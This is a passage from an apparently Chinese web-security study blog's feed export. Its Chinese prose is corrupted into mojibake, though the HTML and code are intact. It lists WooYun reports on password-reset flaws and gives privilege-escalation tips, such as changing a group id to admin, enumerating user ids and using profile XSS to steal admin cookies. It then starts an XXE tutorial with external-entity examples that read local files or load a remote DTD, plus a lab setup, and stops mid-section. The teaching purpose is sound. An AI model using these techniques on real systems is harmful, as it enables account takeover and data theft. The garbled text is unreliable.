<p>è´¦å·ä¸æ‰‹æœºå·ç çš„ç»‘å®š</p>
<p><a href="https://wooyun.x10sec.org/static/bugs/wooyun-2014-075941.html">WooYun: ä¸Šæµ·ç”µä¿¡é€šè¡Œè¯ä»»æ„å¯†ç é‡ç½®</a></p>
<p><strong>è´¦å·ä¸é‚®ç®±è´¦å·çš„ç»‘å®š</strong></p>
<p><a href="https://wooyun.x10sec.org/static/bugs/wooyun-2014-078208.html">WooYun: é­…æ—çš„è´¦å·ç³»ç»Ÿå†…å­˜åœ¨æ¼æ´å¯å¯¼è‡´ä»»æ„è´¦æˆ·çš„å¯†ç é‡ç½®</a></p>
<p><a href="https://wooyun.x10sec.org/static/bugs/wooyun-2015-091216.html">WooYun: å’Œè®¯ç½‘ä¿®æ”¹ä»»æ„ç”¨æˆ·å¯†ç æ¼æ´</a></p>
<p><strong>æ‰¾å›æ­¥éª¤</strong></p>
<p>è·³è¿‡éªŒè¯æ­¥éª¤ã€æ‰¾å›æ–¹å¼ï¼Œç›´æ¥åˆ°è®¾ç½®æ–°å¯†ç é¡µé¢</p>
<p><a href="https://wooyun.x10sec.org/static/bugs/wooyun-2013-042404.html">WooYun: OPPOæ‰‹æœºåŒæ­¥å¯†ç éšæ„ä¿®æ”¹ï¼ŒçŸ­ä¿¡é€šè®¯å½•éšæ„æŸ¥çœ‹</a></p>
<p><a href="https://wooyun.x10sec.org/static/bugs/wooyun-2015-098765.html">WooYun: ä¸­å›½ç”µä¿¡æŸIDCæœºæˆ¿ä¿¡æ¯å®‰å…¨ç®¡ç†ç³»ç»Ÿè®¾è®¡ç¼ºé™·è‡´ä½¿ç³»ç»Ÿæ²¦é™·</a></p>
<p><strong>æœ¬åœ°éªŒè¯</strong></p>
<p>åœ¨æœ¬åœ°éªŒè¯æœåŠ¡å™¨çš„è¿”å›ä¿¡æ¯ï¼Œç¡®å®šæ˜¯å¦æ‰§è¡Œé‡ç½®å¯†ç ï¼Œä½†æ˜¯å…¶è¿”å›ä¿¡æ¯æ˜¯å¯æ§çš„å†…å®¹ï¼Œæˆ–è€…å¯ä»¥å¾—åˆ°çš„å†…å®¹</p>
<p><a href="https://wooyun.x10sec.org/static/bugs/wooyun-2014-083035.html">WooYun: çœ‹æˆ‘å¦‚ä½•é‡ç½®ä¹å³°ç½‘ä¾›åº”å•†ç®¡ç†ç³»ç»Ÿä»»æ„ç”¨æˆ·å¯†ç ï¼ˆç®¡ç†å‘˜å·²è¢«é‡ç½®ï¼‰</a></p>
<p><a href="https://wooyun.x10sec.org/static/bugs/wooyun-2014-069987.html">WooYun: oppoé‡ç½®ä»»æ„ç”¨æˆ·å¯†ç æ¼æ´(4)</a></p>
<p><strong>å‘é€çŸ­ä¿¡ç­‰éªŒè¯ä¿¡æ¯çš„åŠ¨ä½œåœ¨æœ¬åœ°è¿›è¡Œï¼Œå¯ä»¥é€šè¿‡ä¿®æ”¹è¿”å›åŒ…è¿›è¡Œæ§åˆ¶</strong></p>
<p><a href="https://wooyun.x10sec.org/static/bugs/wooyun-2013-020532.html">WooYun: OPPOä¿®æ”¹ä»»æ„å¸å·å¯†ç -3</a></p>
<p><a href="https://wooyun.x10sec.org/static/bugs/wooyun-2013-020425.html">WooYun: OPPOä¿®æ”¹ä»»æ„å¸å·å¯†ç -2</a></p>
<p><strong>æ³¨å…¥</strong></p>
<p>åœ¨æ‰¾å›å¯†ç å¤„å­˜åœ¨æ³¨å…¥æ¼æ´</p>
<p><a href="https://wooyun.x10sec.org/static/bugs/wooyun-2014-068060.html">WooYun: ç”¨å‹äººåŠ›èµ„æºç®¡ç†è½¯ä»¶ï¼ˆe-HRï¼‰å¦ä¸€å¤„SQLæ³¨å…¥æ¼æ´ï¼ˆé€šæ€æ‰€æœ‰ç‰ˆæœ¬ï¼‰</a></p>
<p><strong>Tokenç”Ÿæˆ</strong></p>
<p>tokenç”Ÿæˆå¯æ§</p>
<p><a href="https://wooyun.x10sec.org/static/bugs/wooyun-2015-094242.html">WooYun: å¤©å¤©ç½‘ä»»æ„è´¦å·å¯†ç é‡ç½®(éæš´åŠ›æ¸©æŸ”ä¿®æ”¹)</a></p>
<p><a href="https://wooyun.x10sec.org/static/bugs/wooyun-2015-095729.html">WooYun: å¤©å¤©ç½‘å†ä¸€æ¬¡é‡ç½®ä»»æ„è´¦å·å¯†ç (ä¾æ—§éæš´åŠ›)</a></p>
<p><strong>æ³¨å†Œè¦†ç›–</strong></p>
<p>æ³¨å†Œé‡å¤çš„ç”¨æˆ·å</p>
<p><a href="https://wooyun.x10sec.org/static/bugs/wooyun-2014-088708.html">WooYun: ä¸­é“å¿«è¿å¥‡è‘©æ–¹å¼é‡ç½®ä»»æ„ç”¨æˆ·å¯†ç (adminç”¨æˆ·æ¼”ç¤º)</a></p>
<p><strong>sessionè¦†ç›–</strong></p>
<p><a href="https://wooyun.x10sec.org/static/bugs/wooyun-2014-085843.html">WooYun: èšç¾ä¼˜å“ä»»æ„ä¿®æ”¹ç”¨æˆ·å¯†ç (éçˆ†ç ´)</a></p>
<h4 id="è¶Šæƒç›¸å…³é€»è¾‘æ¼æ´">è¶Šæƒç›¸å…³é€»è¾‘æ¼æ´</h4>
<p>è¶Šæƒæ¼æ´æ˜¯Webåº”ç”¨ç¨‹åºä¸­ä¸€ç§å¸¸è§çš„å®‰å…¨æ¼æ´ã€‚å®ƒçš„å¨èƒåœ¨äºä¸€ä¸ªè´¦æˆ·å³å¯æ§åˆ¶å…¨ç«™ç”¨æˆ·æ•°æ®ã€‚å½“ç„¶è¿™äº›æ•°æ®ä»…é™äºå­˜åœ¨æ¼æ´åŠŸèƒ½å¯¹åº”çš„æ•°æ®ã€‚è¶Šæƒæ¼æ´çš„æˆå› ä¸»è¦æ˜¯å› ä¸ºå¼€å‘äººå‘˜åœ¨å¯¹æ•°æ®è¿›è¡Œå¢ã€åˆ ã€æ”¹ã€æŸ¥è¯¢æ—¶å¯¹å®¢æˆ·ç«¯è¯·æ±‚çš„æ•°æ®è¿‡åˆ†ç›¸ä¿¡è€Œé—æ¼äº†æƒé™çš„åˆ¤å®šã€‚æ‰€ä»¥æµ‹è¯•è¶Šæƒå°±æ˜¯å’Œå¼€å‘äººå‘˜æ‹¼ç»†å¿ƒçš„è¿‡ç¨‹ã€‚</p>
<h5 id="å¸¸è§æ‰‹æ³•-v3">å¸¸è§æ‰‹æ³•</h5>
<ul>
<li>æ“ä½œæ—¶åˆ†æè¯·æ±‚ä¸­çš„æ•°æ®åŒ…ï¼Œçœ‹çœ‹æ¯ä¸ªå‚æ•°çš„ä½œç”¨ï¼Œä¿®æ”¹å‚æ•°æŸ¥çœ‹å˜åŒ–ã€‚</li>
<li>æ‹¥æœ‰æ›´å¤šæƒé™çš„è´¦å·ï¼ŒæŠŠèƒ½è®¿é—®çš„URLéƒ½æå–å‡ºæ¥ï¼Œç»™ä½æƒé™ç”¨æˆ·è®¿é—®æˆ–è€…ç›´æ¥è®¿é—®ï¼ŒæŸ¥çœ‹èƒ½å¦è®¿é—®ã€‚</li>
<li>çŒœæµ‹éšè—çš„APIï¼Œå¦‚:guest/getorderï¼Œä¿®æ”¹æˆadmin/getorderã€‚</li>
<li>é€šè¿‡æœç´¢å¼•æ“ï¼Œæˆ–è€…æå–JSä¸­çš„URLï¼ŒæŸ¥æ‰¾éšè—åŠŸèƒ½ã€‚å¦‚burpsuiteä¸­æœ‰ä¸€ä¸ªBHP JS scraperçš„æ’ä»¶ã€‚</li>
<li>çŒœæµ‹éšè—çš„å‚æ•°ï¼Œæ·»åŠ è¿›å»æŸ¥çœ‹å˜åŒ–ï¼Œå¦‚ä¿®æ”¹ä¿¡æ¯çš„æ—¶å€™åŠ ä¸ªIDã€‚</li>
<li>æŠ“å–æ‰€æœ‰çš„æ•°æ®åŒ…ï¼Œæœç´¢ç”¨æˆ·åç­‰å…³é”®è¯ï¼Œæ¯”å¦‚æˆ‘çš„ç”¨æˆ·åæ˜¯testï¼Œåœ¨burpsuiteä¸­çš„HTTP historyæœç´¢testï¼Œçœ‹çœ‹æœ‰æ²¡æœ‰å“ªä¸ªæ•°æ®åŒ…åŒ…å«è¿™ä¸ªå‚æ•°,å°†å…¶ä¿®æ”¹ä¸ºå…¶ä»–çš„ç”¨æˆ·åï¼ŒæŸ¥çœ‹å˜åŒ–ã€‚</li>
</ul>
<p><a href="https://mp.weixin.qq.com/s/-CWizFUofM78DkvymqEHiA">JSRCâ€”â€”è¶Šæƒæ¼æ´æŒ–æ˜</a></p>
<p><a href="https://mp.weixin.qq.com/s/1mapo4wno1uMctrIEJwKvQ">JSRCâ€”â€”èŠèŠè¶Šæƒé‚£äº›äº‹</a></p>
<p><a href="https://wooyun.x10sec.org/static/drops/tips-727.html">æˆ‘çš„è¶Šæƒä¹‹é“</a></p>
<p>å‚ç›´è¶Šæƒçš„æ‰‹æ³•ï¼š</p>
<ul>
<li>
<p>ç¼–è¾‘ä¸ªäººä¿¡æ¯çš„æ—¶å€™ï¼Œä¿®æ”¹æƒé™ç»„çš„idï¼Œä¸€èˆ¬ç®¡ç†å‘˜çš„å€¼ä¸º0æˆ–è€…1ï¼›</p>
</li>
<li>
<p>åå°ä¿®æ”¹å¯†ç çš„åœ°æ–¹ï¼Œå¦‚æœæ˜¯æ ¹æ®useridæ¥ä¿®æ”¹å¯†ç çš„ï¼Œå¯ä»¥ä¿®æ”¹idçš„å€¼æ¥ä¿®æ”¹ç®¡ç†å‘˜çš„å¯†ç ï¼›</p>
</li>
<li>
<p>åœ¨ä¸ªäººèµ„æ–™å¤„æ’å…¥XSSè„šæœ¬ï¼Œä¸€èˆ¬èƒ½æ‰“åˆ°ç®¡ç†å‘˜cookieçš„æ¦‚ç‡å¾ˆå¤§ï¼›</p>
</li>
<li>
<p>æŸ¥çœ‹ä¸ªäººèµ„æ–™çš„æ—¶å€™ï¼Œå¦‚æœæ˜¯æ ¹æ®idæ¥æ˜¾ç¤ºï¼Œä¸€èˆ¬éƒ½æœ‰è¶Šæƒï¼Œå¯ä»¥éå†idè·å–ç®¡ç†å‘˜ä¿¡æ¯ï¼›</p>
</li>
<li>
<p>æµ‹è¯•åå°åŠŸèƒ½ï¼Œæ‰¾ä¸€ä¸‹æ³¨å…¥ã€ä¸Šä¼ ã€å‘½ä»¤æ‰§è¡Œç­‰æ¼æ´ï¼Œç›´æ¥æ‹¿ä¸‹æ•°æ®åº“æƒé™æˆ–è€…shellï¼Œå†æ‰¾ç®¡ç†å‘˜æƒé™å°±è½»è€Œæ˜“ä¸¾äº†ã€‚</p>
</li>
</ul>
<h3 id="å…¶ä»–èµ„æ–™">å…¶ä»–èµ„æ–™</h3>
<p><a href="https://github.com/PyxYuYu/MyBlog/issues/102">ä¸šåŠ¡é€»è¾‘æ¼æ´æ€»ç»“</a></p>
<p><a href="https://mp.weixin.qq.com/s/-r1oWQb_oS8jEMdJs9Ct_g">JSRCâ€”â€”ä¸šåŠ¡é€»è¾‘æ¼æ´æŒ–æ˜</a></p>
<p><a href="https://mp.weixin.qq.com/s/ElICF5Uja7-sNJnGhrG_9Q">JSRCâ€”â€”äº¤æ˜“æ”¯ä»˜æ¼æ´æŒ–æ˜</a></p>
<p><a href="https://mp.weixin.qq.com/s/RMx1tqAcmqjxFvolHGAovw">JSRCâ€”â€”Webæ¼æ´ä¹‹é€»è¾‘æ¼æ´æŒ–æ˜</a></p>
<p><a href="https://mp.weixin.qq.com/s/Y8yLweZn6JbRClucLazOeg">JSRCâ€”â€”æ‰¹é‡Webæ¼æ´æŒ–æ˜</a></p>
<h2 id="Reference">Reference</h2>
<p><a href="https://xz.aliyun.com/t/6401#toc-5">[çº¢æ—¥å®‰å…¨]Webå®‰å…¨Day6 - ä¸šåŠ¡é€»è¾‘æ¼æ´å®æˆ˜æ”»é˜²</a></p>
<p><a href="http://bobao.360.cn/learning/detail/287.html">å¯†ç æ‰¾å›é€»è¾‘æ¼æ´æ€»ç»“</a></p>
]]></content>
      <categories>
        <category>webå®‰å…¨</category>
        <category>åŸºç¡€å­¦ä¹ </category>
      </categories>
      <tags>
        <tag>webå®‰å…¨å­¦ä¹ </tag>
        <tag>é€»è¾‘æ¼æ´</tag>
      </tags>
  </entry>
  <entry>
    <title>Webå®‰å…¨å­¦ä¹ ä¹‹XXEæ¼æ´åˆ©ç”¨</title>
    <url>/Web_security/basic_learning/20.xxe%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/</url>
    <content><![CDATA[<h1 id="Webå®‰å…¨å­¦ä¹ ä¹‹XXEæ¼æ´åˆ©ç”¨">Webå®‰å…¨å­¦ä¹ ä¹‹XXEæ¼æ´åˆ©ç”¨</h1>
<h2 id="ä»€ä¹ˆæ˜¯XXE">ä»€ä¹ˆæ˜¯XXE</h2>
<p>XXEï¼šXML External Entity å³å¤–éƒ¨å®ä½“ï¼Œä»å®‰å…¨è§’åº¦ç†è§£æˆXML External Entity attack å¤–éƒ¨å®ä½“æ³¨å…¥æ”»å‡»ï¼ˆé‚£ä¸ºå•¥ä¸å«XEEï¼‰ã€‚å¯¹äº XXE æƒ³è¦çœŸæ­£çš„äº†è§£å®ƒï¼Œå°±éœ€è¦å…ˆæ¥äº†è§£ä¸€ä¸‹XMLæ˜¯ä»€ä¹ˆã€‚</p>
<p>XMLï¼ˆExtensible Markup Languageï¼‰è‹±æ–‡ç›´è¯‘å°±æ˜¯å¯æ‰©å±•æ ‡è®°è¯­è¨€ï¼Œâ€œæ ‡è®°â€ æ˜¯æŒ‡è®¡ç®—æœºæ‰€èƒ½ç†è§£çš„ä¿¡æ¯ç¬¦å·ï¼Œé€šè¿‡æ­¤ç§æ ‡è®°ï¼Œè®¡ç®—æœºä¹‹é—´å¯ä»¥å¤„ç†åŒ…å«å„ç§ä¿¡æ¯çš„æ–‡ç« ç­‰ã€‚</p>
<p>å¦‚æœæŠŠ HTML å’Œ XML è¿›è¡Œå¯¹æ¯”çš„è¯ï¼Œ HTML æ—¨åœ¨æ˜¾ç¤ºæ•°æ®ä¿¡æ¯ï¼Œè€Œ XML æ—¨åœ¨ä¼ è¾“æ•°æ®ä¿¡æ¯ã€‚ï¼ˆè¯´åˆ°ä¼ è¾“æ•°æ®è‡ªç„¶è€Œç„¶è‚¯å®šä¼šæƒ³åˆ°jsonæ ¼å¼ï¼Œç›¸æ¯”XMLï¼Œç°åœ¨ç”¨çš„æ›´å¤šæ˜¯jsonæ ¼å¼æ¥ä¼ è¾“æ•°æ®ï¼‰</p>
<h3 id="XMLåŸºæœ¬çŸ¥è¯†">XMLåŸºæœ¬çŸ¥è¯†</h3>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">to</span>&gt;</span>ca01h<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">from</span>&gt;</span>njupt<span class="tag">&lt;/<span class="name">from</span>&gt;</span>xml</span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>åœ¨ä¸Šé¢ä»£ç ä¸­çš„ç¬¬ä¸€è¡Œï¼Œå®šä¹‰XMLçš„ç‰ˆæœ¬ä¸ç¼–ç ã€‚</p>
<p>åœ¨XMLæ–‡æ¡£ä¸­ï¼Œæ‰€æœ‰çš„å…ƒç´ éƒ½å¿…é¡»æ­£ç¡®çš„åµŒå¥—ï¼Œå½¢æˆæ ‘å½¢ç»“æ„ã€‚å¹¶ä¸”æ•´ä¸ªXMLæ–‡æ¡£ä¸­å¿…é¡»è¦æœ‰ä¸€ä¸ªæ ¹å…ƒç´ ã€‚å¦‚ä¸Šä»£ç ï¼Œ<code>&lt;note&gt;</code>æ˜¯æ•´ä¸ªæ–‡æ¡£çš„æ ¹å…ƒç´ ã€‚åµŒå¥—åœ¨noteæ ‡ç­¾ä¸­çš„<code>&lt;to&gt;</code>å’Œ<code>&lt;from&gt;</code>åˆ™æ˜¯æ ¹çš„å­å…ƒç´ ã€‚</p>
<p>åŒæ—¶ï¼Œæ‰€æœ‰çš„XMLå…ƒç´ éƒ½å¿…é¡»æœ‰å…³é—­æ ‡ç­¾ï¼Œè¿™ç‚¹ä¸åƒhtmlè¯­æ³•é‚£æ ·æ¾æ•£ã€‚å¦‚æœç¼ºå¤±å…³é—­æ ‡ç­¾ï¼Œåˆ™ä¼šå¯¼è‡´XMLè§£æå¤±è´¥ã€‚</p>
<h3 id="å®ä½“">å®ä½“</h3>
<p>æ‰€æœ‰çš„XMLæ–‡æ¡£éƒ½ç”±äº”ç§ç®€å•çš„æ„å»ºæ¨¡å—ï¼ˆå…ƒç´ ï¼Œå±æ€§ï¼Œå®ä½“ï¼ŒPCDATA CDATAï¼‰æ„æˆã€‚è¿™é‡Œç€é‡ä»‹ç»ä¸€ä¸‹å®ä½“ï¼šå®ä½“æ˜¯ç”¨äºå®šä¹‰å¼•ç”¨æ™®é€šæ–‡æœ¬æˆ–ç‰¹æ®Šå­—ç¬¦çš„å¿«æ·æ–¹å¼çš„å˜é‡ï¼Œå®ä½“å¼•ç”¨æ˜¯å¯¹å®ä½“çš„å¼•ç”¨ã€‚å®ä½“å¯åœ¨å†…éƒ¨æˆ–å¤–éƒ¨è¿›è¡Œå£°æ˜ã€‚å› æ­¤æˆ‘ä»¬åˆ©ç”¨å¼•å…¥å®ä½“ï¼Œæ„é€ æ¶æ„å†…å®¹ï¼Œä»è€Œè¾¾åˆ°æ”»å‡»çš„ç›®çš„ã€‚</p>
<p>å®ä½“æ€»å…±æœ‰å››ç§ï¼Œåˆ†åˆ«æ˜¯ï¼š</p>
<ul>
<li>
<p>å†…ç½®å®ä½“ (Built-in entities)</p>
</li>
<li>
<p>å­—ç¬¦å®ä½“ (Character entities)</p>
</li>
<li>
<p>é€šç”¨å®ä½“ (General entities)</p>
</li>
<li>
<p>å‚æ•°å®ä½“ (Parameter entities)</p>
</li>
</ul>
<p>å…¶ä¸­å†…ç½®å®ä½“å’Œå­—ç¬¦å®ä½“éƒ½å’Œ HTML çš„å®ä½“ç¼–ç ç±»ä¼¼ï¼Œä½†å¦‚æœä»å¦ä¸€ä¸ªè§’åº¦çœ‹ï¼Œå®ä½“å®Œå…¨å¯ä»¥åˆ†æˆä¸¤ä¸ªæ´¾åˆ«ï¼šé€šç”¨å®ä½“å’Œå‚æ•°å®ä½“ã€‚</p>
<h3 id="DTD">DTD</h3>
<p>XMLçš„è¯­è¨€è§„èŒƒæ˜¯ç”±DTDï¼ˆDocument Type Definitionï¼‰æ¥æ§åˆ¶ï¼Œç±»ä¼¼ç¼–ç¨‹è¯­è¨€çš„è¯­æ³•ï¼Œå®ƒå®šä¹‰äº†XMLæ–‡æ¡£çš„åˆæ³•æ„å»ºæ¨¡å—ï¼Œå³å£°æ˜äº†XMLçš„å†…å®¹æ ¼å¼è§„èŒƒã€‚</p>
<p>DTD çš„å£°æ˜æ–¹å¼åˆ†ä¸ºä¸¤ç§ï¼šå†…éƒ¨ DTD å’Œå¤–éƒ¨ DTD ï¼Œå…¶åŒºåˆ«å°±åœ¨äºï¼šå¯¹ XML æ–‡æ¡£ä¸­çš„å…ƒç´ ã€å±æ€§å’Œå®ä½“çš„ DTD çš„å£°æ˜æ˜¯åœ¨ XML æ–‡æ¡£å†…éƒ¨å¼•ç”¨è¿˜æ˜¯å¼•ç”¨å¤–éƒ¨çš„ dtd æ–‡ä»¶ã€‚</p>
<h4 id="å†…éƒ¨å¼•ç”¨">å†…éƒ¨å¼•ç”¨</h4>
<p>ä¸‹é¢æ˜¯ä¸€ä¸ªå†…éƒ¨DTDçš„XMLç¤ºä¾‹ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!--XMLå£°æ˜--&gt;</span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!--DTDï¼Œæ–‡æ¡£ç±»å‹å£°æ˜--&gt;</span><br><span class="line">&lt;!DOCTYPE note [ #å®šä¹‰æ­¤æ–‡æ¡£æ˜¯noteç±»å‹</span><br><span class="line">&lt;!ELEMENT note (body)&gt; #å®šä¹‰noteå…ƒç´ æœ‰ä¸€ä¸ªå…ƒç´ ï¼š&quot;body&quot;</span><br><span class="line">&lt;!ELEMENT body (#PCDATA)&gt; #å®šä¹‰bodyå…ƒç´ ä¸º&quot;#PCDATA&quot;ç±»å‹</span><br><span class="line">&lt;!ENTITY writer &quot;hello world&quot;&gt; #å®šä¹‰ä¸€ä¸ªå†…éƒ¨å®ä½“</span><br><span class="line">]&gt;</span><br><span class="line">&lt;!--æ–‡æ¡£å…ƒç´ --&gt;                                                                        </span><br><span class="line">&lt;note&gt;</span><br><span class="line">&lt;body&gt;&amp;writer;&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;note&gt;</span><br></pre></td></tr></table></figure>
<p>ä¸Šé¢ç¬¬7è¡Œå®šä¹‰äº†ä¸€ä¸ªå†…éƒ¨å®ä½“ï¼Œç¬¬11è¡Œä¸­å¯¹ä¸Šé¢å®šä¹‰çš„writerå®ä½“è¿›è¡Œäº†å¼•ç”¨ï¼Œåˆ°æ—¶å€™è¾“å‡ºçš„æ—¶å€™&amp;writerå°±ä¼šè¢«&quot;hello world&quot;æ›¿æ¢ã€‚</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY å®ä½“åç§° &quot;å®ä½“çš„å€¼&quot;&gt;</span><br></pre></td></tr></table></figure>
<p>ä¸€ä¸ªå®ä½“ç”±ä¸‰éƒ¨åˆ†æ„æˆ:&amp;ç¬¦å·, å®ä½“åç§°, åˆ†å· (ğŸ˜‰ï¼Œè¿™é‡Œ&amp;ä¸è®ºåœ¨GETè¿˜æ˜¯åœ¨POSTä¸­éƒ½éœ€è¦è¿›è¡ŒURLç¼–ç ï¼Œå› ä¸ºæ˜¯ä½¿ç”¨å‚æ•°ä¼ å…¥xmlçš„ï¼Œ&amp;ç¬¦å·ä¼šè¢«è®¤ä¸ºæ˜¯å‚æ•°é—´çš„è¿æ¥ç¬¦å·</p>
<h4 id="å¤–éƒ¨å¼•ç”¨">å¤–éƒ¨å¼•ç”¨</h4>
<h5 id="é€šç”¨å®ä½“">é€šç”¨å®ä½“</h5>
<p>ä¸‹é¢å†æ¥çœ‹çœ‹ä¸€ä¸ªå¤–éƒ¨DTDçš„XMLç¤ºä¾‹ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo [</span><br><span class="line">&lt;!ELEMENT foo ANY &gt; #å®šä¹‰å…ƒç´ ä¸ºANYï¼Œå³å¯ä»¥æ¥å—ä»»ä½•å…ƒç´ ã€‚</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;c:&#x2F;test.dtd&quot; &gt;]&gt;</span><br><span class="line">&lt;root&gt;</span><br><span class="line">&lt;body&gt;&amp;xxe;&lt;&#x2F;body&gt; #å®šä¹‰ä¸€ä¸ªå¤–éƒ¨å®ä½“</span><br><span class="line">&lt;&#x2F;root&gt;</span><br></pre></td></tr></table></figure>
<p>é€šè¿‡ç¬¬ 4 è¡Œçš„å®šä¹‰ï¼Œ ç¬¬ 7 è¡Œçš„ &amp;xxe å°±ä¼šå¯¹ c:/test.dtd æ–‡ä»¶èµ„æºè¿›è¡Œ SYSTEM å…³é”®å­—çš„å¼•ç”¨ï¼Œè¿™æ ·å¯¹å¼•ç”¨èµ„æºæ‰€åšçš„ä»»ä½•æ›´æ”¹éƒ½ä¼šåœ¨æ–‡æ¡£ä¸­è‡ªåŠ¨æ›´æ–°ã€‚</p>
<p>å¦å¤–é™¤äº†ä¸Šé¢ SYSTEM å…³é”®å­—çš„å¼•ç”¨æ–¹å¼ï¼Œè¿˜æœ‰ä¸€ç§å¼•ç”¨æ–¹å¼æ˜¯ä½¿ç”¨ PUBLIC å¼•ç”¨å…¬ç”¨ DTD çš„æ–¹å¼ï¼Œè¯­æ³•å¦‚ä¸‹ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE æ ¹å…ƒç´ åç§° PUBLIC â€œDTDæ ‡è¯†åâ€ â€œå…¬ç”¨DTDçš„URIâ€&gt;</span><br></pre></td></tr></table></figure>
<p>è¿™ä¸ªåœ¨æˆ‘ä»¬çš„æ”»å‡»ä¸­ä¹Ÿå¯ä»¥èµ·åˆ°å’Œ SYSTEM ä¸€æ ·çš„ä½œç”¨ï¼Œä½†å®é™…ä¸Šå®ä½“è¿œä¸æ­¢è¿™ä¸€ç§ï¼Œæˆ‘ä»¬ä»¥ä¸Šæ¶‰åŠçš„å®ä½“åªæ˜¯å…¶ä¸­çš„ä¸€ç§ï¼Œè¢«ç§°ä¸ºé€šç”¨å®ä½“ã€‚</p>
<h5 id="å‚æ•°å®ä½“">å‚æ•°å®ä½“</h5>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY % an-element &quot;&lt;!ELEMENT mytag (subtag)&gt;&quot;&gt;</span><br><span class="line">&lt;!ENTITY % remote-dtd SYSTEM &quot;http:&#x2F;&#x2F;somewhere.example.org&#x2F;remote.dtd&quot;&gt;</span><br><span class="line">%an-element; %remote-dtd;</span><br></pre></td></tr></table></figure>
<p>åœ¨ä¸Šé¢çš„ä»£ç ç¤ºä¾‹ä¸­ï¼Œå¯ä»¥çœ‹åˆ°å®ä½“åå‰å¤šäº†ä¸€ä¸ª â€œ%â€ ï¼Œåœ¨å‚æ•°å®ä½“ä¸­ä½¿ç”¨ â€œ% å®ä½“åâ€ (è¿™é‡Œé¢çš„ç©ºæ ¼ä¸èƒ½å°‘) å®šä¹‰ï¼Œå¹¶ä¸”åªèƒ½åœ¨ DTD ä¸­ä½¿ç”¨ â€œ% å®ä½“åâ€ å¼•ç”¨ã€‚</p>
<p>å¦å¤–å’Œé€šç”¨å®ä½“ä¸€æ ·ï¼Œå‚æ•°å®ä½“ä¹Ÿå¯ä»¥å¤–éƒ¨å¼•ç”¨ï¼ŒåŒæ—¶åªæœ‰åœ¨ DTD æ–‡ä»¶ä¸­ï¼Œå‚æ•°å®ä½“çš„å£°æ˜æ‰èƒ½å¼•ç”¨å…¶ä»–å®ä½“ã€‚</p>
<h3 id="XMLæ³¨å…¥">XMLæ³¨å…¥</h3>
<p>ä¸‹é¢æ˜¯ä¸€ä¸ªæ™®é€šçš„XMLæ³¨å…¥ä¾‹å­ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># æ³¨å…¥å‰XMLä»£ç </span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;&gt;</span><br><span class="line">&lt;USER role&#x3D;&quot;admin&quot;&gt;ç”¨æˆ·è¾“å…¥ä½ç½®&lt;&#x2F;USER&gt;</span><br></pre></td></tr></table></figure>
<p>å½“ç”¨æˆ·è¾“å…¥ä¸€äº›æ¶æ„ä»£ç ï¼Œæ¯”å¦‚<code>User1&lt;/USER&gt;&lt;USER role=&quot;admin&quot;&gt;User2</code>ï¼ŒåŸXMLä»£ç å°±å˜æˆäº†ä¸‹é¢çš„æ ·å­ï¼š</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># æ³¨å…¥åXMLä»£ç </span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;&gt;</span><br><span class="line">&lt;USER role&#x3D;&quot;admin&quot;&gt;User1&lt;&#x2F;USER&gt;</span><br><span class="line">&lt;USER role&#x3D;&quot;admin&quot;&gt;User2&lt;&#x2F;USER&gt;</span><br></pre></td></tr></table></figure>
<p>å¯ä»¥çœ‹åˆ°é€šè¿‡XMLè¯­å¥çš„å‰åæ‹¼æ¥ï¼Œ XMLä»£ç è¢«æ’å…¥äº†è¿›å»ã€‚</p>
<p>å¯¹æ™®é€šçš„ XML æ³¨å…¥ï¼Œåˆ©ç”¨é¢æ¯”è¾ƒç‹­çª„ï¼Œç°å®ä¸­ä¹Ÿæ˜¯æ¯”è¾ƒé¸¡è‚‹çš„å­˜åœ¨ï¼Œå› æ­¤å‡ ä¹ç”¨ä¸åˆ°ï¼Œå¦‚æœæœ‰çš„è¯åº”è¯¥ä¹Ÿæ˜¯é€»è¾‘æ¼æ´ï¼Œä¸‹é¢å°±é‡ç‚¹ä»‹ç»XXEçš„åˆ©ç”¨ã€‚</p>
<h2 id="XXEåˆ©ç”¨">XXEåˆ©ç”¨</h2>
<p><strong>å®éªŒç¯å¢ƒ</strong></p>
<p>ç›®æ ‡é¶æœºï¼š</p>
<p>IPï¼š192.168.0.104</p>
<p>ç¯å¢ƒï¼šWin7+phpStudy+apache+php</p>
<p>æœ¬åœ°ä¸»æœºï¼š</p>
<p>IPï¼š192.168.0.108</p>
<p>ç¯å¢ƒï¼šWin10+phpStudy+apache+BurpSuite+Python3</p>
<h3 id="æœ‰å›æ˜¾è¯»æœ¬åœ°æ•æ„Ÿæ–‡ä»¶ï¼ˆNormal-XXEï¼‰">æœ‰å›æ˜¾è¯»æœ¬åœ°æ•æ„Ÿæ–‡ä»¶ï¼ˆNormal XXEï¼‰</h3>
<p>ç›®æ ‡é¶æœºï¼šxxe_test.php</p>
